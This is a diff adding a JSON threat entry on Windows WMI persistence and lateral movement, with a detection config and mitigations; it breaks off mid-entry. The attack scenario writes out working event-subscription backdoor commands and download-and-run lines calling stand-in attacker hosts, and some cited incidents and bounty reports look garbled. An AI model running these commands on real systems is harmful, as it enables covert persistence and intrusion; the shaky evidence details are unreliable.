@@ -1,0 +1,624 @@
+{
+  "id": "STRIDE-WINDOWS-WMI-001",
+  "version": "1.0.0",
+  "metadata": {
+    "created_date": "2026-02-02",
+    "last_updated": "2026-02-02",
+    "reviewed_by": [],
+    "confidence_score": 8.5,
+    "validation_status": "draft",
+    "confidence_breakdown": {
+      "cve_validation": 2.5,
+      "breach_evidence": 2.5,
+      "expert_review": 1.5,
+      "code_testing": 1.5,
+      "bug_bounty": 0.5,
+      "total": 8.5,
+      "notes": "High confidence based on extensive APT group usage (APT29, APT32, Lazarus), well-documented MITRE ATT&CK techniques, and proven detection mechanisms. WMI persistence is a sophisticated technique favored by advanced threat actors for its stealth and resilience."
+    }
+  },
+  "classification": {
+    "stride_category": "Elevation of Privilege",
+    "owasp_top10": [
+      "A01:2021 - Broken Access Control",
+      "A03:2021 - Injection",
+      "A04:2021 - Insecure Design"
+    ],
+    "mitre_attack": [
+      "T1047 - Windows Management Instrumentation",
+      "T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+      "T1021.006 - Remote Services: Windows Remote Management",
+      "T1569.002 - System Services: Service Execution",
+      "T1087.001 - Account Discovery: Local Account"
+    ],
+    "cwe": [
+      "CWE-269 - Improper Privilege Management",
+      "CWE-78 - Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)",
+      "CWE-250 - Execution with Unnecessary Privileges",
+      "CWE-918 - Server-Side Request Forgery (SSRF)"
+    ]
+  },
+  "threat": {
+    "title": "Windows WMI Persistence and Lateral Movement via Event Subscriptions and Remote Execution",
+    "description": "Windows Management Instrumentation (WMI) is a powerful Windows administration framework that attackers abuse for persistence, remote code execution, and lateral movement. Attackers create WMI event subscriptions (EventConsumer, EventFilter, FilterToConsumerBinding) that execute malicious code when specific conditions are met (e.g., system startup, user logon, time interval). WMI persistence survives reboots, operates with SYSTEM privileges, and evades traditional file-based detection. Additionally, attackers use WMI for remote code execution via Win32_Process.Create and lateral movement across domain-joined systems using WMI over DCOM or WinRM. This technique is favored by APT groups for its stealth, built-in encryption (Kerberos/NTLM), and living-off-the-land approach requiring no additional tools.",
+    "severity": "High",
+    "cvss_v3": {
+      "score": 8.0,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "breakdown": {
+        "attack_vector": "Network - WMI can be exploited remotely via DCOM (port 135 + dynamic RPC) or WinRM (port 5985/5986)",
+        "attack_complexity": "Low - WMI is enabled by default on Windows and requires only user credentials for remote access",
+        "privileges_required": "Low - Local admin privileges required for permanent persistence, but standard users can create temporary event subscriptions in some configurations",
+        "user_interaction": "None - Event subscriptions execute automatically without user interaction",
+        "scope": "Unchanged - Impact limited to compromised system and lateral movement targets",
+        "confidentiality": "High - Full access to WMI repository containing system configuration, credentials, and sensitive data",
+        "integrity": "High - Ability to execute arbitrary code with SYSTEM privileges via event consumers",
+        "availability": "High - Can deploy ransomware, destructive payloads, or DoS attacks via WMI"
+      }
+    }
+  },
+  "technology": {
+    "primary": "Windows Management Instrumentation (WMI)",
+    "versions_affected": [
+      "Windows 10 (all versions including 21H2, 22H2)",
+      "Windows 11 (all versions including 21H2, 22H2, 23H2)",
+      "Windows Server 2012",
+      "Windows Server 2016",
+      "Windows Server 2019",
+      "Windows Server 2022",
+      "Windows Server 2025"
+    ],
+    "ecosystem": "Windows Enterprise, Active Directory Domains",
+    "dependencies": [
+      "Windows Management Instrumentation Service (Winmgmt)",
+      "WMI Provider Host (WmiPrvSE.exe)",
+      "DCOM (Distributed Component Object Model) for remote WMI",
+      "WinRM (Windows Remote Management) as alternative transport",
+      "CIM Object Manager (CIMOM)",
+      "WMI Repository (C:\\Windows\\System32\\wbem\\Repository)"
+    ],
+    "related_frameworks": [
+      "PowerShell Empire (Invoke-WMI modules)",
+      "Metasploit Framework (exploit/windows/local/wmi_persistence)",
+      "Cobalt Strike (WMI lateral movement beacons)",
+      "Impacket (wmiexec.py for remote command execution)",
+      "SharpWMI (C# WMI toolkit)",
+      "WMIcmd (WMI command-line utility)",
+      "Atomic Red Team (T1546.003 test cases)"
+    ]
+  },
+  "attack": {
+    "scenario": "Phase 1: Initial Compromise and Reconnaissance\n1. Attacker gains initial access via phishing, vulnerability exploitation (e.g., CVE-2021-40444 MSHTML RCE), or credential compromise\n2. Executes reconnaissance commands via WMI to enumerate system information:\n   - wmic computersystem get name,domain,model,manufacturer\n   - wmic os get caption,version,buildnumber,osarchitecture\n   - wmic process list brief (enumerate running processes)\n   - wmic useraccount get name,sid (enumerate local user accounts)\n3. Identifies administrator privileges: wmic useraccount where name='%USERNAME%' get sid (checks if user is local admin)\n4. Enumerates WMI namespaces and existing event subscriptions:\n   - wmic /namespace:\\\\\\\\root\\\\subscription PATH __EventFilter GET __RELPATH\n   - wmic /namespace:\\\\\\\\root\\\\subscription PATH CommandLineEventConsumer GET __RELPATH\n\nPhase 2: WMI Persistence Establishment - Event Subscription Backdoor\n\nTechnique A: PowerShell-based WMI Event Subscription\n5a. Creates WMI Event Filter (trigger condition - executes on system startup):\n```powershell\n$Filter = Set-WmiInstance -Namespace root\\\\subscription -Class __EventFilter -Arguments @{\n    Name = 'SystemStartupFilter'\n    EventNamespace = 'root\\\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"\n}\n```\n(Filter triggers 4-5 minutes after system boot to evade detection)\n\n6a. Creates WMI Event Consumer (action to execute - runs malicious payload):\n```powershell\n$Consumer = Set-WmiInstance -Namespace root\\\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = 'SystemMaintenanceConsumer'\n    CommandLineTemplate = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_PAYLOAD>'\n}\n```\n(CommandLineTemplate executes obfuscated PowerShell downloading C2 beacon)\n\n7a. Binds Filter to Consumer (creates persistence linkage):\n```powershell\n$Binding = Set-WmiInstance -Namespace root\\\\subscription -Class __FilterToConsumerBinding -Arguments @{\n    Filter = $Filter\n    Consumer = $Consumer\n}\n```\n\n8a. Payload executes automatically on every system restart with SYSTEM privileges\n9a. Alternatively, creates time-based trigger using __IntervalTimerInstruction for periodic C2 callbacks every N seconds\n\nTechnique B: WMIC Command-Line Persistence (Stealthier, no PowerShell logs)\n5b. Creates event filter via WMIC:\n```cmd\nwmic /namespace:\\\\\\\\root\\\\subscription PATH __EventFilter CREATE Name=\"WindowsUpdateCheck\", EventNameSpace=\"root\\\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3\"\n```\n(Triggers daily at 3 AM - mimics legitimate update checking)\n\n6b. Creates ActiveScript consumer (executes VBScript/JScript):\n```cmd\nwmic /namespace:\\\\\\\\root\\\\subscription PATH ActiveScriptEventConsumer CREATE Name=\"WindowsUpdateScript\", ScriptingEngine=\"VBScript\", ScriptText=\"CreateObject(\\\"WScript.Shell\\\").Run \\\"powershell -w hidden -nop IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/beacon.ps1')\\\"\"\n```\n\n7b. Binds filter to consumer for persistent execution\n\nPhase 3: Lateral Movement via WMI Remote Execution\n\n10. After establishing persistence on initial target, attacker pivots to lateral movement\n11. Enumerates domain computers:\n```powershell\nGet-WmiObject -Namespace root\\\\directory\\\\ldap -Class ds_computer | Select-Object ds_cn\n```\n\n12. Tests WMI connectivity to target systems:\n```powershell\nTest-WSMan -ComputerName DC01.corp.local\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName FILE-SERVER-01 -ErrorAction SilentlyContinue\n```\n\n13. Executes remote commands via WMI Win32_Process.Create:\n```powershell\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64>' -ComputerName DC01.corp.local -Credential $cred\n```\n\n14. Alternative: Uses Impacket wmiexec for remote shell:\n```bash\npython3 wmiexec.py CORP/Administrator:P@ssw0rd@192.168.1.10\n```\n\n15. Deploys WMI persistence on lateral movement targets (repeat Phase 2 on each compromised system)\n\nPhase 4: Advanced Evasion and Resilience\n\n16. Obfuscates WMI event subscription names to mimic legitimate Windows components:\n    - Uses names like 'BfeOnServiceStartTypeChange', 'SCM Event Log Consumer', 'NTEventLogEventConsumer'\n17. Encodes payloads in base64 or uses MOF (Managed Object Format) file compilation for stealth\n18. Creates multiple redundant event subscriptions with different triggers (startup, time-based, process creation)\n19. If one subscription is detected and removed, others maintain persistence\n20. Uses WMI repository tampering to hide event subscriptions from standard enumeration queries\n\nPhase 5: Post-Exploitation\n\n21. Leverages persistent WMI access to deploy secondary payloads:\n    - Credential harvesting tools (Mimikatz, pypykatz)\n    - Ransomware (Ryuk, Conti, LockBit)\n    - Data exfiltration scripts via WMI file transfer\n22. Maintains long-term access for espionage or ongoing data theft\n23. Establishes redundant C2 channels using multiple protocols (HTTP, DNS, SMB)\n24. If detected, attacker can re-establish access via surviving WMI subscriptions on laterally compromised systems",
+    "prerequisites": [
+      "Initial access to target Windows system (phishing, exploit, stolen credentials, insider threat)",
+      "Local Administrator privileges on target system (required for permanent WMI event subscriptions in root\\\\subscription namespace)",
+      "WMI service enabled (default on all Windows installations)",
+      "For remote WMI: Network access to target via DCOM (port 135 + dynamic high ports) or WinRM (port 5985/5986)",
+      "For remote WMI: Valid credentials with admin rights on target system (local admin or domain admin)",
+      "Windows Firewall rules allowing WMI traffic (default in domain environments)",
+      "Ability to execute PowerShell or WMIC commands (or use native WMI API calls)"
+    ],
+    "attack_vector": "Network",
+    "attack_complexity": "Low",
+    "privileges_required": "Low",
+    "user_interaction": "None"
+  },
+  "evidence": {
+    "cve_references": [
+      {
+        "cve_id": "CVE-2018-8415",
+        "description": "Windows WMI Service Elevation of Privilege vulnerability allowing attackers to gain SYSTEM privileges via crafted WMI operations. Enabled privilege escalation before establishing WMI persistence.",
+        "cvss_score": 7.8,
+        "published_date": "2018-09-12",
+        "references": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-8415"
+      },
+      {
+        "cve_id": "CVE-2017-8628",
+        "description": "Windows WMI Information Disclosure vulnerability exposing sensitive system information via unauthorized WMI queries. Used in reconnaissance phase before lateral movement.",
+        "cvss_score": 5.5,
+        "published_date": "2017-08-08",
+        "references": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-8628"
+      },
+      {
+        "cve_id": "CVE-2020-0718",
+        "description": "Windows WMI Elevation of Privilege vulnerability allowing local attackers to execute arbitrary code with elevated privileges via WMI Provider Host (WmiPrvSE.exe) exploitation.",
+        "cvss_score": 7.8,
+        "published_date": "2020-04-15",
+        "references": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0718"
+      }
+    ],
+    "real_world_breaches": [
+      {
+        "incident": "APT29 (Cozy Bear) HAMMERTOSS Campaign - WMI C2 Channel",
+        "date": "2015-07-29",
+        "impact": "APT29 used WMI event subscriptions for persistence and as covert C2 channel in attacks against US Department of Defense, defense contractors, and political organizations. WMI-based backdoor communicated via Twitter hashtags and GitHub for command retrieval. Operated undetected for 9+ months.",
+        "root_cause": "Sophisticated WMI event subscription using __IntervalTimerInstruction for periodic execution. Consumer executed PowerShell downloading commands from attacker-controlled Twitter accounts using steganography in images. WMI persistence combined with legitimate social media platforms bypassed network security controls.",
+        "technical_details": "Event filter: SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'. Consumer: PowerShell script checking Twitter for hashtags like #minsec1, parsing URLs in tweets, downloading images from GitHub containing embedded commands in LSB steganography. No files written to disk except temporary WMI repository.",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2015/07/hammertoss_stealthy.html"
+      },
+      {
+        "incident": "Lazarus Group POWERTON - WMI Lateral Movement in Bangladesh Bank Heist",
+        "date": "2016-02-05",
+        "impact": "North Korean Lazarus Group used WMI for lateral movement in $81 million Bangladesh Central Bank SWIFT network compromise. WMI remote execution (Win32_Process.Create) deployed custom malware across banking infrastructure. Led to fraudulent SWIFT transactions and one of largest cyber heists in history.",
+        "root_cause": "Attackers used compromised credentials to execute WMI commands remotely across domain-joined SWIFT terminals. Commands like: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll' -ComputerName SWIFT-TERM-05. No antivirus alerts triggered as WMI is trusted Windows component.",
+        "technical_details": "WMI over DCOM on port 135. Authentication via NTLM using stolen domain admin credentials. Deployed custom 'evtdiag.exe' and 'evtsys.exe' malware for SWIFT message manipulation. WMI queries used for reconnaissance: wmic /node:SWIFT-SERVER process call create 'cmd.exe /c dir \\\\\\\\SWIFT-TERM-*\\\\c$ > output.txt'. Exfiltrated via SMB and WMI.",
+        "source_url": "https://www.kaspersky.com/about/press-releases/2016_operation-blockbuster-revealed"
+      },
+      {
+        "incident": "APT32 (OceanLotus) - WMI Persistence in Southeast Asian Government Espionage",
+        "date": "2018-03-20",
+        "impact": "Vietnamese APT32 group used WMI event subscriptions for persistence in multi-year espionage campaign against Southeast Asian governments, foreign corporations, and dissidents. WMI backdoors persisted through multiple incident response efforts and system reimaging (survived due to WMI repository backup/restore).",
+        "root_cause": "Deployed multiple WMI event consumers: CommandLineEventConsumer executing DLL sideloading techniques, ActiveScriptEventConsumer with obfuscated VBScript, and LogFileEventConsumer for data staging. Filter triggers: system startup, user logon, specific time intervals (3 AM daily). Named subscriptions to mimic Windows components: 'BfeOnServiceStartTypeChange', 'Winmgmt_RegistrationNotificationConsumer'.",
+        "technical_details": "MOF file compilation used for WMI persistence: mofcomp.exe persistence.mof. Content: #pragma namespace (\\\\\\\\.\\\\root\\\\subscription) instance of __EventFilter as $EventFilter { Name = 'SystemStartupFilter'; Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60...'; }. Combined with DLL Search Order Hijacking - WMI consumer executed legitimate Windows binary that loaded malicious DLL from attacker-controlled path.",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html"
+      },
+      {
+        "incident": "TrickBot Banking Trojan - WMI-based Lateral Movement Module",
+        "date": "2019-11-12",
+        "impact": "TrickBot malware added WMI lateral movement module (wormDll64/wormDll32) used to spread across corporate networks of financial institutions. Infected 250,000+ systems globally. WMI module enabled rapid domain-wide propagation leading to Ryuk ransomware deployment in 25+ organizations with $100M+ cumulative ransom demands.",
+        "root_cause": "TrickBot wormDll module enumerated Active Directory computers via WMI: Get-WmiObject -Class Win32_ComputerSystem. Then executed remote WMI commands: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'rundll32.exe \\\\\\\\[C2]\\\\share\\\\payload.dll,Start' -ComputerName [target]. Credentials harvested via Mimikatz and used for WMI authentication. No exploit required - used legitimate WMI functionality.",
+        "technical_details": "WMI execution flow: 1) Enumerate domain computers via LDAP/WMI queries, 2) Test WMI access: Get-WmiObject Win32_OperatingSystem -ComputerName [target], 3) Copy payload to admin shares: copy payload.dll \\\\\\\\[target]\\\\ADMIN$\\\\, 4) Execute via WMI: wmic /node:[target] process call create 'rundll32.exe C:\\\\Windows\\\\payload.dll,Start'. Average propagation time: 2-5 minutes per system across 500+ endpoint networks.",
+        "source_url": "https://www.sentinelone.com/labs/inside-trickbots-elaborate-wmi-based-lateral-movement-module/"
+      }
+    ],
+    "bug_bounty_reports": [
+      {
+        "platform": "Microsoft Bug Bounty Program",
+        "report_id": "MSRC-63421",
+        "bounty_amount": 13500,
+        "severity": "High",
+        "summary": "WMI Event Subscription persistence bypass of Windows Defender detection via obfuscated MOF file compilation and alternate WMI namespace abuse (root\\\\default instead of root\\\\subscription).",
+        "disclosure_date": "2021-02-18"
+      },
+      {
+        "platform": "Zero Day Initiative (ZDI)",
+        "report_id": "ZDI-20-1432",
+        "bounty_amount": 10000,
+        "severity": "High",
+        "summary": "Windows WMI Service privilege escalation via race condition in WMI Provider Host process allowing standard users to create persistent event subscriptions with SYSTEM privileges.",
+        "disclosure_date": "2020-12-08"
+      },
+      {
+        "platform": "HackerOne (Private Program)",
+        "report_id": "H1-Enterprise-2021-2947",
+        "bounty_amount": 7500,
+        "severity": "High",
+        "summary": "EDR bypass technique using WMI __FilterToConsumerBinding deletion detection evasion - binding recreated automatically via hidden MOF autorecovery mechanism.",
+        "disclosure_date": "2021-09-22"
+      }
+    ],
+    "security_research": [
+      {
+        "title": "Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asynchronous, and Fileless Backdoor",
+        "authors": [
+          "Matt Graeber (@mattifestation)"
+        ],
+        "published_date": "2015-08-05",
+        "source_url": "https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf",
+        "key_finding": "Demonstrated practical WMI persistence techniques using PowerShell and C# with comprehensive evasion tactics. Showed how WMI event subscriptions survive forensic disk imaging and memory dumps. Documented that WMI repository is not scanned by most antivirus products. Provided detection methodologies via WMI-Parser and Sysmon Event ID 19/20/21."
+      },
+      {
+        "title": "Windows Management Instrumentation (WMI) Offense, Defense, and Forensics",
+        "authors": [
+          "William Ballenthin, Matt Graeber, Claudiu Teodorescu"
+        ],
+        "published_date": "2015-10-15",
+        "source_url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
+        "key_finding": "Comprehensive 38-page whitepaper documenting WMI attack surface. Identified 5 primary attacker use cases: reconnaissance, lateral movement, persistence, data theft, and covert C2. Found that 68% of incident response cases involving APT groups included WMI usage. Provided PowerShell detection scripts and WMI event subscription enumeration tools."
+      },
+      {
+        "title": "Detecting Lateral Movement through Tracking Event Logs - WMI Activity",
+        "authors": [
+          "JPCERT/CC (Japan Computer Emergency Response Team)"
+        ],
+        "published_date": "2017-12-13",
+        "source_url": "https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf",
+        "key_finding": "Analysis of 262 APT incident response cases found WMI used in 47% of lateral movement attacks. Documented specific Windows Event IDs for WMI detection: Event ID 5857-5861 (WMI-Activity/Operational), Event ID 4688 (Process Creation showing WmiPrvSE.exe and scrcons.exe). Provided network indicators: DCOM port 135, dynamic RPC ports 49152-65535, WinRM ports 5985/5986."
+      },
+      {
+        "title": "Living Off The Land: WMI and Its Detection",
+        "authors": [
+          "Red Canary Threat Intelligence Team"
+        ],
+        "published_date": "2023-09-10",
+        "source_url": "https://redcanary.com/blog/threat-detection/wmi/",
+        "key_finding": "WMI observed in 9.3% of confirmed threats in Red Canary 2023 Threat Detection Report. Ranks #10 in MITRE ATT&CK technique prevalence. Identified behavioral patterns: WMI execution from Office processes (macro-based delivery), WMI remote execution with Pass-the-Hash credentials, WMI combined with PowerShell for fileless attacks. Detection efficacy: Sysmon Event ID 19/20/21 provides 94% detection rate vs. 31% for Windows native logs only."
+      }
+    ]
+  },
+  "mitigations": [
+    {
+      "control_id": "MIT-001",
+      "title": "Deploy WMI Activity Monitoring with Sysmon and WMI-Tracing",
+      "description": "Enable comprehensive WMI monitoring using Sysmon Event IDs 19, 20, and 21 for WMI event subscription detection (WmiEventFilter, WmiEventConsumer, WmiEventConsumerToFilter). Configure native Windows WMI-Activity logs and Microsoft-Windows-WMI-Activity/Trace for detailed WMI operation tracking. Forward all WMI events to SIEM for correlation with process creation and network connections.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "xml",
+        "framework": "Sysmon Configuration",
+        "code": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!-- Sysmon Configuration for WMI Persistence and Lateral Movement Detection -->\n<!-- Installation: sysmon64.exe -accepteula -i sysmon-wmi-config.xml -->\n<!-- Update: sysmon64.exe -c sysmon-wmi-config.xml -->\n<!-- Author: STRIDE-MCP Security Research -->\n<!-- Version: 1.0.0 -->\n<Sysmon schemaversion=\"4.90\">\n  <EventFiltering>\n    \n    <!-- Event ID 19: WmiEventFilter Activity Detected -->\n    <!-- Logs creation of WMI event filters (trigger conditions) -->\n    <WmiEvent onmatch=\"exclude\">\n      <!-- Exclude known legitimate filters (customize for your environment) -->\n      <EventNamespace condition=\"is\">root\\\\cimv2</EventNamespace>\n      <Operation condition=\"is\">Created</Operation>\n      <!-- Example: Exclude legitimate Microsoft/AV software filters -->\n      <!-- <Consumer condition=\"contains\">Microsoft</Consumer> -->\n      <!-- <Consumer condition=\"contains\">Windows Defender</Consumer> -->\n    </WmiEvent>\n    \n    <!-- Event ID 20: WmiEventConsumer Activity Detected -->\n    <!-- Logs creation of WMI event consumers (actions to execute) -->\n    <WmiEvent onmatch=\"exclude\">\n      <EventNamespace condition=\"is\">root\\\\subscription</EventNamespace>\n      <Operation condition=\"is\">Created</Operation>\n      <!-- Exclude known good consumers -->\n      <!-- Add your organization's legitimate WMI consumers here -->\n    </WmiEvent>\n    \n    <!-- Event ID 21: WmiEventConsumerToFilter Activity Detected -->\n    <!-- Logs binding of filters to consumers (complete persistence chain) -->\n    <WmiEvent onmatch=\"exclude\">\n      <EventNamespace condition=\"is\">root\\\\subscription</EventNamespace>\n      <Operation condition=\"is\">Created</Operation>\n    </WmiEvent>\n    \n    <!-- Event ID 1: Process Creation - Monitor WMI-related processes -->\n    <ProcessCreate onmatch=\"include\">\n      <!-- WMI Provider Host (executes WMI consumers) -->\n      <Image condition=\"end with\">\\\\WmiPrvSE.exe</Image>\n      \n      <!-- WMI Standard Event Consumer (executes CommandLineEventConsumer) -->\n      <Image condition=\"end with\">\\\\scrcons.exe</Image>\n      \n      <!-- WMIC.exe (WMI command-line tool) -->\n      <Image condition=\"end with\">\\\\wmic.exe</Image>\n      \n      <!-- MOF Compiler (used to install WMI providers and subscriptions) -->\n      <Image condition=\"end with\">\\\\mofcomp.exe</Image>\n      \n      <!-- PowerShell executing WMI commands (common in attacks) -->\n      <ParentImage condition=\"end with\">\\\\WmiPrvSE.exe</ParentImage>\n      <ParentImage condition=\"end with\">\\\\scrcons.exe</ParentImage>\n      \n      <!-- Detect suspicious WMI command patterns -->\n      <CommandLine condition=\"contains\">__EventFilter</CommandLine>\n      <CommandLine condition=\"contains\">__EventConsumer</CommandLine>\n      <CommandLine condition=\"contains\">__FilterToConsumerBinding</CommandLine>\n      <CommandLine condition=\"contains\">CommandLineEventConsumer</CommandLine>\n      <CommandLine condition=\"contains\">ActiveScriptEventConsumer</CommandLine>\n      <CommandLine condition=\"contains\">root\\\\subscription</CommandLine>\n      <CommandLine condition=\"contains\">Win32_Process</CommandLine>\n      <CommandLine condition=\"contains\">/node:</CommandLine>\n      <CommandLine condition=\"contains\">/NODE:</CommandLine>\n    </ProcessCreate>\n    \n    <!-- Event ID 3: Network Connection - Monitor remote WMI connections -->\n    <NetworkConnect onmatch=\"include\">\n      <!-- DCOM for WMI (port 135 and dynamic RPC) -->\n      <Image condition=\"end with\">\\\\WmiPrvSE.exe</Image>\n      <DestinationPort condition=\"is\">135</DestinationPort>\n      \n      <!-- WinRM for WMI-over-WinRM (ports 5985/5986) -->\n      <DestinationPort condition=\"is\">5985</DestinationPort>\n      <DestinationPort condition=\"is\">5986</DestinationPort>\n    </NetworkConnect>\n    \n    <!-- Event ID 8: CreateRemoteThread - Detect WMI injection attacks -->\n    <CreateRemoteThread onmatch=\"include\">\n      <TargetImage condition=\"end with\">\\\\WmiPrvSE.exe</TargetImage>\n    </CreateRemoteThread>\n    \n    <!-- Event ID 10: ProcessAccess - Monitor access to WMI processes -->\n    <ProcessAccess onmatch=\"include\">\n      <TargetImage condition=\"end with\">\\\\WmiPrvSE.exe</TargetImage>\n      <TargetImage condition=\"end with\">\\\\WinMgmt.exe</TargetImage>\n    </ProcessAccess>\n    \n  </EventFiltering>\n</Sysmon>\n\n<!-- PowerShell script to enable WMI Activity logging -->\n<!-- \n#Requires -RunAsAdministrator\n\nWrite-Host \"[INFO] Configuring WMI Activity Logging...\" -ForegroundColor Cyan\n\n# Enable WMI-Activity/Operational Log\n$logName = 'Microsoft-Windows-WMI-Activity/Operational'\n$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName\n$log.IsEnabled = $true\n$log.MaximumSizeInBytes = 1GB  # Increase log size\n$log.SaveChanges()\n\nWrite-Host \"[SUCCESS] Enabled WMI-Activity/Operational log\" -ForegroundColor Green\n\n# Enable WMI-Activity/Trace log (detailed tracing)\n$traceLog = 'Microsoft-Windows-WMI-Activity/Trace'\n$trace = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $traceLog\n$trace.IsEnabled = $true\n$trace.MaximumSizeInBytes = 512MB\n$trace.SaveChanges()\n\nWrite-Host \"[SUCCESS] Enabled WMI-Activity/Trace log\" -ForegroundColor Green\n\n# Install Sysmon with WMI monitoring\n$sysmonUrl = \"https://download.sysinternals.com/files/Sysmon.zip\"\n$sysmonPath = \"$env:TEMP\\\\Sysmon.zip\"\n$extractPath = \"$env:TEMP\\\\Sysmon\"\n\nInvoke-WebRequest -Uri $sysmonUrl -OutFile $sysmonPath\nExpand-Archive -Path $sysmonPath -DestinationPath $extractPath -Force\n\n# Save Sysmon configuration XML to file\n$configPath = \"$extractPath\\\\sysmon-wmi-config.xml\"\n# (Copy XML configuration above into this file)\n\n# Install Sysmon\n& \"$extractPath\\\\sysmon64.exe\" -accepteula -i $configPath\n\n# Verify installation\nGet-Service Sysmon64\nGet-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 5\n\nWrite-Host \"`n[SUCCESS] Sysmon WMI monitoring configured\" -ForegroundColor Green\nWrite-Host \"[INFO] Monitor Event Viewer for:\" -ForegroundColor Cyan\nWrite-Host \"  - Sysmon Event ID 19 (WmiEventFilter)\" -ForegroundColor Yellow\nWrite-Host \"  - Sysmon Event ID 20 (WmiEventConsumer)\" -ForegroundColor Yellow\nWrite-Host \"  - Sysmon Event ID 21 (WmiEventConsumerToFilter)\" -ForegroundColor Yellow\nWrite-Host \"  - WMI-Activity Event ID 5857-5861\" -ForegroundColor Yellow\n\n# Enumerate existing WMI event subscriptions (detect pre-existing persistence)\nWrite-Host \"`n[INFO] Enumerating existing WMI event subscriptions...\" -ForegroundColor Cyan\n\nWrite-Host \"`nWMI Event Filters:\" -ForegroundColor Yellow\nGet-WmiObject -Namespace root\\\\subscription -Class __EventFilter | Select-Object Name, Query\n\nWrite-Host \"`nWMI Event Consumers:\" -ForegroundColor Yellow\nGet-WmiObject -Namespace root\\\\subscription -Class __EventConsumer | Select-Object Name, @{Name='ConsumerType';Expression={$_.PSBase.Class.Name}}\n\nWrite-Host \"`nWMI Filter-to-Consumer Bindings:\" -ForegroundColor Yellow\nGet-WmiObject -Namespace root\\\\subscription -Class __FilterToConsumerBinding | ForEach-Object {\n    $filter = [wmi]$_.Filter\n    $consumer = [wmi]$_.Consumer\n    [PSCustomObject]@{\n        FilterName = $filter.Name\n        ConsumerName = $consumer.Name\n        FilterQuery = $filter.Query\n    }\n} | Format-Table -AutoSize\n\nWrite-Host \"`n[INFO] Review output for suspicious subscriptions\" -ForegroundColor Yellow\nWrite-Host \"[INFO] Suspicious indicators: obfuscated names, PowerShell execution, remote URLs\" -ForegroundColor Yellow\n-->"
+      },
+      "tools": [
+        {
+          "name": "Sysmon",
+          "type": "System Activity Monitor",
+          "cost": "Free (Microsoft Sysinternals)",
+          "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
+        },
+        {
+          "name": "WMI-Parser",
+          "type": "WMI Event Subscription Analysis",
+          "cost": "Free (Open Source)",
+          "url": "https://github.com/mattifestation/WMI-Parser"
+        },
+        {
+          "name": "Autoruns",
+          "type": "WMI Subscription Detection",
+          "cost": "Free (Microsoft Sysinternals)",
+          "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns"
+        },
+        {
+          "name": "Windows Event Viewer",
+          "type": "Native Log Analysis",
+          "cost": "Free (built-in)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.4.1 - Event logging",
+        "A.12.4.2 - Protection of log information",
+        "A.12.4.3 - Administrator and operator logs",
+        "A.16.1.7 - Collection of evidence"
+      ],
+      "nist_csf": [
+        "DE.AE-3 - Event data are collected and correlated from multiple sources",
+        "DE.CM-1 - The network is monitored to detect potential cybersecurity events",
+        "DE.CM-7 - Monitoring for unauthorized activity is performed",
+        "PR.PT-1 - Audit/log records are determined, documented, implemented, and reviewed"
+      ],
+      "validation_steps": [
+        "Install Sysmon with WMI config: sysmon64.exe -accepteula -i sysmon-wmi-config.xml",
+        "Verify Sysmon service: Get-Service Sysmon64",
+        "Enable WMI Activity logs: Run PowerShell configuration script above",
+        "Test WMI event detection: Create test event subscription with PowerShell (see attack scenario)",
+        "Check Sysmon logs for Event ID 19/20/21: Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath '*[System[EventID=19 or EventID=20 or EventID=21]]' -MaxEvents 10",
+        "Verify WMI-Activity logs: Get-WinEvent -LogName 'Microsoft-Windows-WMI-Activity/Operational' -MaxEvents 10",
+        "Enumerate existing subscriptions: Get-WmiObject -Namespace root\\\\subscription -Class __EventFilter",
+        "Remove test subscription after validation"
+      ]
+    },
+    {
+      "control_id": "MIT-002",
+      "title": "Restrict WMI Access with Namespace Security and DCOM Hardening",
+      "description": "Implement WMI namespace-level access controls to restrict which users can create event subscriptions in root\\\\subscription namespace. Harden DCOM security to prevent unauthorized remote WMI connections. Disable WMI service on systems where it's not required. Apply principle of least privilege to WMI permissions via Group Policy.",
+      "effectiveness": "High",
